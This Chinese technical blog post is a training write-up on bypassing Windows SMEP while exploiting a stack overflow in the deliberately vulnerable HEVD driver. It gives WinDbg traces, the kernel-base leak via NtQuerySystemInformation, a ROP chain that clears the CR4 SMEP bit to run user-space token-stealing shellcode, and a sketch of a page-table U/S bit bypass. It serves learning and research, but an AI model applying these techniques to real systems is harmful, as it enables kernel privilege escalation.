
# 【技术分享】HEVD内核漏洞训练之SMEP绕过


                                阅读量   
                                **183427**
                            
                        |
                        
                                                                                    



**[![](./img/85624/t01b42f0d220c2afe1d.jpg)](./img/85624/t01b42f0d220c2afe1d.jpg)**

**传送门**

[**【技术分享】HEVD内核漏洞训练——陪Windows玩儿**](http://bobao.360.cn/learning/detail/3544.html)

**<br>**

**0x00 前言**

这篇的内容比较基础，也比较好玩，当然，一直看到袁哥提到的DVE bypass mitigation的，关于DVE感觉非常神奇，不过我还是不太了解，非常想学。

前两天在安全客发了一篇HEVD内核漏洞训练的文章，其中主要和大家分享了一下我的偶像MJ0011在HITCON上提到的Windows 8之后的新防护机制。后来Cn33liz又更新了一个HEVD Kernel StackOverflow的exp，正好提到了SMEP Bypass。

Cn33liz exp地址：[https://github.com/Cn33liz/HSEVD-StackOverflowX64](https://github.com/Cn33liz/HSEVD-StackOverflowX64) 

而SMEP Bypass相关的show case有一个非常好的文章在： https://www.coresecurity.com/system/files/publications/2016/05/Windows SMEP bypass U-S.pdf 

这里我尝试了文中提到的几种bypass SMEP的方法进行了尝试，和大家一起分享一下这个过程，在此之前想和大家说一下之前的一些误区。

首先在上一篇HEVD内核漏洞训练中，我提到关于NtAllocateVirtualMemory返回STATUS_SUCCESS之后仍然无法申请内存的问题，当时描述出了问题－－实际上，当NtAllocateVirtualMemory返回STATUS_SUCCESS之后内存已经是可以申请的了，只需要通过memset初始化内存即可。

经过和安全客小编的沟通，已经在文中修改了这处错误，实在抱歉！

第二点是关于Cn33liz的exploit中，在他构造rop chain的时候，覆盖的地址偏移是2072，我发现这个地址并非是ret address，而是2088这个偏移才能够将rop chain的地址覆盖上。

上一篇在安全客的地址：[http://bobao.360.cn/learning/detail/3544.html](http://bobao.360.cn/learning/detail/3544.html) 

在本文中，我对一种常见的获取内核信息的函数NtQuerySystemInformation进行了跟踪分析，对几种绕过SMEP的方法也进行了一些跟踪，感觉与系统博弈的过程还是艰辛又好玩的，做了一些总结然后和大家一起分享。请师傅们多多交流指正。

[![](./img/85624/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t016a13515cf177d822.png)

<br>

**0x01 SMEP**

SMEP有点像DEP，是内核的一种缓解措施，我们可以将它简单的理解成禁止在内核态下执行用户空间的代码，下面我们来看一下SMEP的作用，首先通过VirtualAlloc申请用户态空间，并将shellcode拷贝至空间。



```
kd&gt; g
Break instruction exception - code 80000003 (first chance)
0033:00007ff7`fcde14d0 cc              int     3
kd&gt; p
0033:00007ff7`fcde14d1 c3              ret
kd&gt; dd e50000//VirtualAlloc 申请e50000内存，并部署shellcode
00000000`00e50000  148b4865 00018825 828b4c00 000000b8
00000000`00e50010  e8888b4d 49000002 8b48098b 8348f851
00000000`00e50020  057404fa eb098b48 418b48f1 49f02460
d&gt; g//memcpy的时候中断调试，rsi向rdi内存拷贝畸形字符串
Breakpoint 0 hit
HEVD!TriggerStackOverflow+0xdf:
fffff800`02280bbf f3a4            rep movs byte ptr [rdi],byte ptr [rsi]
kd&gt; bp fffff80002280bc1
kd&gt; r rsi
rsi=0000000000fe35d0
kd&gt; dd fe35d0//查看寄存器覆盖情况
00000000`00fe35d0  90909090 90909090 90909090 90909090
```

可以看到，在HEVD中调用memcpy之后，会覆盖到内核栈中的返回地址，在ret返回的时候，会由于栈溢出，跳转到我们之前部署的shellcode的地址e50000位置，这是用户态空间，SMEP开始工作了。



```
kd&gt; !analyze -v//SMEP引发BSOD，ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************
ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY (fc)
```

SMEP会导致BSOD，报错内容是ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY。

[![](./img/85624/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01f19bd5b281be20e6.png)

<br>

**0x02 NtQuerySystemInformation的工作**

正如开始的时候我说SMEP有点像DEP，绕过DEP比较常见的方法就是ROP，因此对抗SMEP的常见方法也是比较简单的方法也是ROP，在DEP中构造ROP需要dll的基址，其实在SMEP中构造ROP需要动态链接库内核的地址，而获取内核地址的一种非常好用的方法就是NtQuerySystemInformation。

当然，这个函数在Medium Integrity下是可以工作的，但是在Low Integrity下是无法获取内核信息的，不过基本都是在Medium Integrity下进行的，只有在微软的一些沙盒中是不能用的，要用其他方法来泄露内核地址。（还记得bitmap吗！也是GdiSharedHandleTable不能用之后改用了gsharedinfo）

首先来看一下NtQuerySystemInformation的工作，先从用户态进入内核态，在64位下通过syscall进入。



```
ntdll!NtQuerySystemInformation:
0033:00007ffe`33f17e30 4c8bd1          mov     r10,rcx
0033:00007ffe`33f17e33 b835000000      mov     eax,35h
0033:00007ffe`33f17e38 0f05            syscall//通过syscall进入内核态
0033:00007ffe`33f17e3a c3              ret
```

在NtQuerySystemInformation传入参数中，第一个表示功能号，这里我们使用的是功能号为11。在NtQuerySystemInformation中会对功能号进行判断，当功能号为11的时候，会执行一些函数调用进行相应的逻辑处理。



```
kd&gt; g
Breakpoint 1 hit
nt!NtQuerySystemInformation://进入内核态 nt!NtQuerySystemInformation
fffff801`dc7d1390 4053            push    rbx
kd&gt; r rcx//系统功能号 11
rcx=000000000000000b
kd&gt; g
Breakpoint 2 hit//采取ecx自减的方法，当ecx为0命中功能号
nt!ExpQuerySystemInformation+0x541:
fffff801`dc7d196d ffc9            dec     ecx
kd&gt; p
nt!ExpQuerySystemInformation+0x543:
fffff801`dc7d196f 0f85dc9f1700    jne     nt! ?? ::NNGAKEGL::`string'+0x1bd51 (fffff801`dc94b951)
kd&gt; r ecx//此时，ecx为0，进入功能号为11的逻辑处理
ecx=0
kd&gt; p
nt!ExpQuerySystemInformation+0x549:
fffff801`dc7d1975 418acb          mov     cl,r11b
kd&gt; p
nt!ExpQuerySystemInformation+0x54c:
fffff801`dc7d1978 e863800d00      call    nt!ExIsRestrictedCaller (fffff801`dc8a99e0)//检查是否是受限调用
kd&gt; p
nt!ExpQuerySystemInformation+0x551://返回值eax
fffff801`dc7d197d 85c0            test    eax,eax
kd&gt; p
nt!ExpQuerySystemInformation+0x553:
fffff801`dc7d197f 0f8547a01700    jne     nt! ?? ::NNGAKEGL::`string'+0x1bdcc (fffff801`dc94b9cc)
kd&gt; r eax// eax为0，非受限调用，可以继续执行下面的获取nt的基址的逻辑
eax=0
kd&gt; p
nt!ExpQuerySystemInformation+0x559://gs指向_kpcr
fffff801`dc7d1985 65488b042588010000 mov   rax,qword ptr gs:[188h]
kd&gt; dt nt!_KPCR
   +0x180 Prcb             : _KPRCB
kd&gt; dt nt!_KPRCB
   +0x008 CurrentThread    : Ptr64 _KTHREAD
```

在功能号为11的逻辑处理中，主要获取内核模块信息的函数是ExpQuerySystemInformation，这个函数中，首先会获得内核的KTHREAD信息，保存至rax中，gs指向kpcr，偏移180h的位置是kprcb，偏移再加8h则指向KTHREAD。接下来会将KernelApcDisable置true。然后会锁定获取资源。



```
kd&gt; p
nt!ExpQuerySystemInformation+0x562://KTHREAD+1E4位置自减，就是KernelApcDisable自减
fffff801`dc7d198e 66ff88e4010000  dec     word ptr [rax+1E4h]
kd&gt; r rax
rax=ffffe00001cac880
kd&gt; !process
PROCESS ffffe00001252900
        THREAD ffffe00001cac880 
kd&gt; dt nt!_KTHREAD KernelApcDisable
   +0x1e4 KernelApcDisable : Int2B
kd&gt; p
nt!ExpQuerySystemInformation+0x569:
fffff801`dc7d1995 418ad5          mov     dl,r13b
kd&gt; dt nt!_KTHREAD KernelApcDisable ffffe00001cac880
   +0x1e4 KernelApcDisable : 0n-1
   kd&gt; p
nt!ExpQuerySystemInformation+0x56c:
fffff801`dc7d1998 488d0da18fefff  lea     rcx,[nt!PsLoadedModuleResource (fffff801`dc6ca940)]//指定资源
kd&gt; p
nt!ExpQuerySystemInformation+0x573:
fffff801`dc7d199f e8bc12c6ff      call    nt!ExAcquireResourceExclusiveLite (fffff801`dc432c60)//获取线程独占访问资源
kd&gt; r rdx//wait = true调用者进入等待状态，直到获取资源
rdx=0000000000000001//
```

随后会进入核心的模块查询函数，这个ExpQueryModuleInformation会遍历kernel的psLoadedModuleList链来获取kernel信息，保存在buffer里，buffer的长度是RTL_PROCESS_MODULE_INFORMATION结构体的长度，然后恢复KernelApcDisable



```
kd&gt; p
nt!ExpQuerySystemInformation+0x57d:
fffff801`dc7d19a9 458bc6          mov     r8d,r14d
kd&gt; p
nt!ExpQuerySystemInformation+0x580:
fffff801`dc7d19ac 488bd3          mov     rdx,rbx
kd&gt; p
nt!ExpQuerySystemInformation+0x583:
fffff801`dc7d19af e8acb60800      call    nt!ExpQueryModuleInformation (fffff801`dc85d060)
kd&gt; p
nt!ExpQuerySystemInformation+0x588:
fffff801`dc7d19b4 89442430        mov     dword ptr [rsp+30h],eax//结构信息存入
kd&gt; dd ffffd00021bc7434
ffffd000`21bc7434  0000ad78 dc444a01 fffff801 03b10000
ffffd000`21bc7444  ffffe000 00000000 fffff801 00000000
kd&gt; p
nt!ExpQuerySystemInformation+0x58c:
fffff801`dc7d19b8 488d0d818fefff  lea     rcx,[nt!PsLoadedModuleResource (fffff801`dc6ca940)]
kd&gt; p
nt!ExpQuerySystemInformation+0x593:
fffff801`dc7d19bf e8cc1ac6ff      call    nt!ExReleaseResourceLite (fffff801`dc433490)//释放资源
kd&gt; p
nt!ExpQuerySystemInformation+0x598://读取KTHREAD
fffff801`dc7d19c4 65488b0c2588010000 mov   rcx,qword ptr gs:[188h]
kd&gt; p
nt!ExpQuerySystemInformation+0x5a1://获得KernelApcDisable
fffff801`dc7d19cd 0fbf81e4010000  movsx   eax,word ptr [rcx+1E4h]
kd&gt; p
nt!ExpQuerySystemInformation+0x5a8://自加恢复
fffff801`dc7d19d4 ffc0            inc     eax
kd&gt; p
nt!ExpQuerySystemInformation+0x5aa:
fffff801`dc7d19d6 668981e4010000  mov     word ptr [rcx+1E4h],ax
kd&gt; p
nt!ExpQuerySystemInformation+0x5b1://处于恢复状态
fffff801`dc7d19dd 6685c0          test    ax,ax
kd&gt; dt nt!_KTHREAD KernelApcDisable ffffe00001cac880
   +0x1e4 KernelApcDisable : 0n0
```

返回后，直接读取这个buffer，对应就是RTL_PROCESS_MODULES对象，直接读对象的ImageAddress就是模块内核地址了，然后就是构造ROP



```
typedef struct _RTL_PROCESS_MODULE_INFORMATION {
HANDLE Section;                 // Not filled in
PVOID MappedBase;
PVOID ImageBase;
ULONG ImageSize;
ULONG Flags;
USHORT LoadOrderIndex;
USHORT InitOrderIndex;
USHORT LoadCount;
USHORT OffsetToFileName;
UCHAR  FullPathName[ 256 ];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;
typedef struct _RTL_PROCESS_MODULES {
ULONG NumberOfModules;
RTL_PROCESS_MODULE_INFORMATION Modules[ 1 ];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;
```

接下来我们来看一下通过IDA反汇编的相关函数的伪代码，对应内容我在代码后面写了注释。



```
int __fastcall ExpQuerySystemInformation(signed int a1, int *a2, unsigned int a3, unsigned __int64 a4, unsigned int Size, signed int *a6)
{
                ⋯⋯
            v7 = a1;//将功能号的值交给v7
            ⋯⋯
        if ( v7 == 11 )//在ExpQuerySystemInformation中会有很多if语句对功能号进行判断，对应功能号执行对应操作，当功能号为11时
        {
          if ( ExIsRestrictedCaller((unsigned int)(v7 - 11), a2, 5368709120i64) )//检查是否是受限调用
            return -1073741790;
          *(_WORD *)(*MK_FP(__GS__, 392i64) + 484i64) = *(_WORD *)(*MK_FP(__GS__, 392i64) + 484i64) - 1;
          ExAcquireResourceExclusiveLite(&amp;PsLoadedModuleResource, v11);//v11的值为1，会等待当前资源释放
          v35 = ExpQueryModuleInformation(v34, (_DWORD *)v6, v12, &amp;v166);//PsLoadedModuleList链读取Modules信息，RTL_PROCESS_MODULES结构
LABEL_95:
          v165 = v35;
          ExReleaseResourceLite(&amp;PsLoadedModuleResource);//释放资源
          v36 = *MK_FP(__GS__, 392i64);
          v37 = *(_WORD *)(*MK_FP(__GS__, 392i64) + 484i64) + 1;
          *(_WORD *)(*MK_FP(__GS__, 392i64) + 484i64) = v37;
          if ( !v37 &amp;&amp; *(_QWORD *)(v36 + 152) != v36 + 152 &amp;&amp; !*(_WORD *)(v36 + 486) )
            KiCheckForKernelApcDelivery();
          goto LABEL_40;
        }
        ⋯⋯
}
```



**0x03 bypass SMEP ROP chain**

在Win8 x64 Medium Integrity下，可以用NtQueryInformation直接获得bypass SMEP的ROP chain。首先可以得到nt的kernel address，通过NTQuerySystemInformation。



```
kd&gt; p
Bypass_SMEP!GetKernelBase+0x8b:
0033:00007ff7`0075108b 33d2            xor     edx,edx
kd&gt; r rbx
rbx=fffff801dc403000
```

这个nt kernel address就是fffff801dc403000，我们接下来构造的ROP chain可以在nt中找到。关于SMEP的控制，取决于cr4寄存器，这个寄存器的比特位们代表了不同的内容。其中，第20位表示的是SMEP的开关。我们可以利用ROP Chain来关闭这个比特位。因此我们需要2个ROP gadgets。



```
fffff801`dc54fa10 nt!HvlEndSystemInterrupt = &lt;no type information&gt;   506f8   909090909090    +14CA30
0033:fffff801`dc54fa30 59              pop     rcx
0033:fffff801`dc54fa31 c3              ret
fffff801`dc5ddba8 nt!KeWakeProcessor = &lt;no type information&gt; 1506f8    +1DABFC
0033:fffff801`dc5ddbfc 0f22e1          mov     cr4,rcx
0033:fffff801`dc5ddbff c3              ret
```

第一个用于将想修改的cr4的值，交给rcx，第二个用于修改cr4寄存器的值。获取win8下cr4的值，其中，第20bit描述的是SMEP，将其置0关闭SMEP。



```
kd&gt; bc 0
kd&gt; g
Breakpoint 1 hit
HEVD!TriggerStackOverflow+0x11c://驱动返回位置
fffff800`02280bfc c3              ret
kd&gt; r rsp
rsp=ffffd0002381e7c8
kd&gt; dd ffffd0002381e7c8//由于栈溢出，返回地址被覆盖，先是ROP Chain
ffffd000`2381e7c8  dc54fa30 fffff801 000506f8 00000000
ffffd000`2381e7d8  dc5ddbfc fffff801 00a60000 00000000
ffffd000`2381e7e8  90909090 90909090 90909090 90909090
ffffd000`2381e7f8  90909090 90909090 dc54fa30 fffff801
ffffd000`2381e808  001506f8 00000000 dc5ddbfc fffff801
ffffd000`2381e818  02281f6e fffff800 0231d010 ffffe000
ffffd000`2381e828  0231d0e0 ffffe000 03c3aa80 ffffe000
ffffd000`2381e838  0000000e 00000000 00222003 00000000
kd&gt; p//进入第一个ROP gadget  pop rcx获取要修改cr4的值
nt+0x14ca30:
fffff801`dc54fa30 59              pop     rcx
kd&gt; p
nt+0x14ca31:
fffff801`dc54fa31 c3              ret
kd&gt; p//将rcx交给cr4，修改cr4的值
nt+0x1dabfc:
fffff801`dc5ddbfc 0f22e1          mov     cr4,rcx
kd&gt; r cr4//cr4当前值，20bit位置值为1
cr4=00000000001506f8
kd&gt; p
nt+0x1dabff:
fffff801`dc5ddbff c3              ret
kd&gt; r cr4//修改后，20bit位置值为0
cr4=00000000000506f8
kd&gt; p//ret后进入shellcode部分，可以执行了
00000000`00a60000 65488b142588010000 mov   rdx,qword ptr gs:[188h]
kd&gt; p
00000000`00a60009 4c8b82b8000000  mov     r8,qword ptr [rdx+0B8h]
```

可以看到，这次跳转到a60000这个用户地址空间后，也可以继续执行shellcode代码了，cr4的20bit位置置0了，SMEP并没有工作，等待替换token之后，再将cr4寄存器恢复即可。最后提权完成。

[![](./img/85624/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0140579a5aa975e52d.png)

<br>

**0x04 另一种SMEP绕过方法**

在开头，我提到了一篇比较有意思的show case，里面提到了一种另类的ROP方法，就是用来欺骗SMEP，在pxe中，有一位表示的是U/S，如果我们将这一位修改，让SMEP认为用户空间是可以执行代码的。

首先，我们需要修改之前NtQuerySystemInformation函数获取的内容，来获取hal的内核地址。



```
00000000`01120140  68828000 fffff801 00075000 08804000  ...h.....P...@..
00000000`01120150  00000001 00150022 7379535c 526d6574  ...."...SystemR
00000000`01120160  5c746f6f 74737973 32336d65 6c61685c  ootsystem32hal
00000000`01120170  6c6c642e 00000000 00000000 00000000  .dll............
0033:00007ff7`157e10b0 4963c3          movsxd  rax,r11d
0033:00007ff7`157e10b3 4869c028010000  imul    rax,rax,128h//获得距离SYSTEM_MODULE_INFORMATION起始地址的偏移
0033:00007ff7`157e10ba 488d4c3830      lea     rcx,[rax+rdi+30h]//30h是模块名称成员距离模块起始的偏移，rcx得到模块成员名称的地址
0033:00007ff7`157e10bf 493bc9          cmp     rcx,r9//判断模块名称是否是我们需要的模块名称
0033:00007ff7`157e10c2 7503            jne     Bypass_SMEP!GetKernelBase+0xc7 (00007ff7`157e10c7)
0033:00007ff7`157e10c4 488b1a          mov     rbx,qword ptr [rdx]
0033:00007ff7`157e10c7 41ffc3          inc     r11d
```

修改的源码如下：



```
Int_3();
    NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &amp;len);
    //try to catch HAL kernel address
    for(i=0;i&lt;ModuleInfo-&gt;NumberOfModules;i++)
    {
        if(!strcmp(ModuleInfo-&gt;Module[i].Name,"\SystemRoot\system32\hal.dll"))
        {
            kernelBase = ModuleInfo-&gt;Module[i].ImageBaseAddress;
            break;
        }
    }
```

在构造rop chain的时候，我们需要下面几个rop gadgets。

1、mov rsp,48000000df  jmp to user space//maybe不用？

2、pop rcx with 0x63 to reset pxe

3、pop rax with pxe(my_addr)-3 

4、mov [rax],ecx

5、invalid TLB(会更新PTE，导致U/S位失效)wbinvd

6、ret to shellcode

本来想试验这个过程，但是有些rop gadget无法获取了，读那个文章中，作者提到了一个stack pivot的地址，利用的是HalpTscTraceProcessorSynchronization函数中的一个位置，可以使rsp栈帧跳转到480000df地址，这是可以通过用户申请的。

但我没有找到这样的地址，我尝试在hal内存空间中搜索这样的rop gadget，也没有找到，但我觉得这个并不影响，可以通过virtualalloc申请，把第二个rop gadget先覆盖在ret即可。

第二个rop gadget需要将0x63赋值给rcx寄存器，这个值用于重新设置pxe中的U/S位。

第三个rop gadget需要将pxe的值交给rax。



```
kd&gt; !pte fffff80aa2c35bfc
                                           VA fffff80aa2c35bfc
PXE at FFFFF6FB7DBEDF80    PPE at FFFFF6FB7DBF0150    PDE at FFFFF6FB7E02A8B0    PTE at FFFFF6FC055161A8
Unable to get PXE FFFFF6FB7DBEDF80
```

第四个rop gadget需要修改pxe的u/s位，也就是mov [rax],ecx。

这里比较有趣的就是第五个rop gadget，这是hal.dll中的一个invalid TLB cache，禁用快表，因为虚拟地址和物理地址转换的时候，有可能会去TLB中直接搜索缓存的地址，如果命中就直接提取。

这里禁用TLB之后，就可以直接去PTE中找对应地址。令我们修改后的U/S起效果。wbinvd汇编指令会禁用这个缓存。



```
.text:00000001C003B8A0 HalpAcpiFlushCache proc near            ; CODE XREF: HalpFlushAndWait+9p
.text:00000001C003B8A0                                         ; HalpDpOfflineProcessorForReplace+57p
.text:00000001C003B8A0                                         ; DATA XREF: ...
.text:00000001C003B8A0                 wbinvd
.text:00000001C003B8A2                 retn
.text:00000001C003B8A2 HalpAcpiFlushCache endp
```

个人感觉比较好用的还是cr4的方法，后者之所以提及，是因为pxe和invalid TLB这两个rop gadget的方法特别有意思。关于SMEP的绕过方法应该还有，内核有很多可以开脑洞的地方，期待更多的研究成果与大家分享，感谢！

<br>



**传送门**

**[【技术分享】HEVD内核漏洞训练——陪Windows玩儿](http://bobao.360.cn/learning/detail/3544.html)**


